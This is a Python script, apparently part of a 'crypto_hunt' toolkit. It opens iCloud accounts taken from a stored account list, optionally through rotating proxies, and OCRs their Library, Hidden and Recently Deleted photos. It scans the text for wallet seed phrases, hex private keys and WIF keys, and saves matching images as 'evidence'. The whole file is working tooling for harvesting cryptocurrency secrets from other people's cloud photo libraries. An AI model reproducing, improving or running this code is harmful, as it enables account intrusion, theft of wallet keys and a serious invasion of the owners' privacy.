#!/usr/bin/env python3
"""CPU OCR sweep of one iCloud account (no pods).

Downloads the cheap thumbnail rendition, reads it with RapidOCR, and keeps the
text.  Images that carry text are marked so a second pass can re-read them at
medium resolution.  Nothing is written to disk except the JSONL (and optional
evidence copies).
"""
from __future__ import annotations

import argparse
import io
import json
import re
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from bulk_images import load_accounts, open_api_safe  # noqa: E402
import crypto_hunt  # noqa: E402
from crypto_hunt import HEX_RE, WIF_RE, fetch  # noqa: E402
from worker import scan  # noqa: E402

AREAS = ("Hidden", "Recently Deleted", "Library")
IMAGE_EXT = {".jpg", ".jpeg", ".png", ".heic", ".heif", ".webp", ".bmp", ".tif", ".tiff", ".gif"}
WORD_RE = re.compile(r"[A-Za-z]{3,}")

_engines = None
_engine_slots = threading.Semaphore(4)
_write_lock = threading.Lock()


def engine():
    global _engines
    if _engines is None:
        from rapidocr_onnxruntime import RapidOCR

        _engines = RapidOCR()
    return _engines


UPSCALE = False


def ocr(raw: bytes) -> tuple[str, int]:
    from PIL import Image

    with Image.open(io.BytesIO(raw)) as image:
        image = image.convert("RGB")
        if UPSCALE and max(image.size) < 1400:
            image = image.resize((image.width * 2, image.height * 2))
        buffer = io.BytesIO()
        image.save(buffer, "JPEG", quality=88)
        payload = buffer.getvalue()
    with _engine_slots:
        result, _ = engine()(payload)
    lines = [part[1] for part in (result or [])]
    return "\n".join(lines), len(lines)


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--email", required=True)
    parser.add_argument("--out", required=True)
    parser.add_argument("--workers", type=int, default=24)
    parser.add_argument("--areas", default=",".join(AREAS))
    parser.add_argument("--rendition", default="thumb")
    parser.add_argument("--limit", type=int, default=0)
    parser.add_argument("--min-words", type=int, default=6)
    parser.add_argument("--engines", type=int, default=4)
    parser.add_argument("--upscale", action="store_true")
    parser.add_argument("--direct", action="store_true", help="download without the HTTP proxies")
    parser.add_argument("--slots", type=int, default=24, help="concurrent downloads")
    args = parser.parse_args()

    out = Path(args.out)
    (out / "evidence").mkdir(parents=True, exist_ok=True)
    started = time.time()

    account = next(a for a in load_accounts() if a["email"] == args.email)
    api = open_api_safe(account)
    word_index = scan.word_index()

    global UPSCALE, _engine_slots
    UPSCALE = bool(args.upscale)
    if args.direct:
        crypto_hunt.PROXIES = []
        crypto_hunt._proxy_cycle = None
    crypto_hunt._download_slots = threading.BoundedSemaphore(max(1, args.slots))
    _engine_slots = threading.Semaphore(max(1, args.engines))

    tasks = []
    for area in [a.strip() for a in args.areas.split(",") if a.strip()]:
        album = api.photos.albums[area]
        count = 0
        for asset in album:
            versions = getattr(asset, "versions", {}) or {}
            original = versions.get("original") or {}
            chosen = versions.get(args.rendition) or versions.get("medium") or original
            url = chosen.get("url")
            name = str(original.get("filename") or getattr(asset, "filename", "") or "")
            if not url or Path(name).suffix.lower() not in IMAGE_EXT:
                continue
            tasks.append(
                {
                    "area": area,
                    "name": name,
                    "url": url,
                    "medium": (versions.get("medium") or {}).get("url") or "",
                    "original": original.get("url") or "",
                }
            )
            count += 1
            if args.limit and len(tasks) >= args.limit:
                break
        print(f"[cpu] {area}: {count} images ({time.time() - started:.0f}s)", flush=True)
        if args.limit and len(tasks) >= args.limit:
            break

    print(f"[cpu] {len(tasks)} images", flush=True)
    handle = (out / "images.jsonl").open("w")
    done = 0
    with_text = 0

    def one(task: dict) -> None:
        nonlocal done, with_text
        record = {"area": task["area"], "name": task["name"], "medium": task["medium"], "original": task["original"]}
        try:
            raw = fetch(task["url"])
            text, lines = ocr(raw)
            words = WORD_RE.findall(text)
            found = list(scan.find_sequences(text, word_index))
            record.update(
                {
                    "lines": lines,
                    "words": len(words),
                    "text": text[:4000],
                    "phrases": found[:5],
                    "hex": sorted(set(HEX_RE.findall(text)))[:5],
                    "wif": sorted(set(WIF_RE.findall(text)))[:3],
                }
            )
            interesting = found or record["hex"] or record["wif"] or len(words) >= args.min_words
            record["interesting"] = bool(interesting)
            if interesting:
                with_text += 1
                safe = re.sub(r"[^A-Za-z0-9._-]+", "_", task["name"])[:70]
                (out / "evidence" / f"{task['area'][:3]}_{safe}").write_bytes(raw)
        except Exception as error:  # noqa: BLE001
            record["error"] = f"{type(error).__name__}: {str(error)[:120]}"
        with _write_lock:
            handle.write(json.dumps(record, ensure_ascii=False) + "\n")
            handle.flush()
            done += 1
            if done % 500 == 0:
                rate = done / max(time.time() - started, 1)
                print(f"[cpu] {done}/{len(tasks)} {rate:.1f}/s text={with_text}", flush=True)

    with ThreadPoolExecutor(max_workers=max(1, args.workers)) as pool:
        list(pool.map(one, tasks))
    handle.close()
    print(f"[cpu] done {done} in {time.time() - started:.0f}s, {with_text} with text", flush=True)


if __name__ == "__main__":
    main()
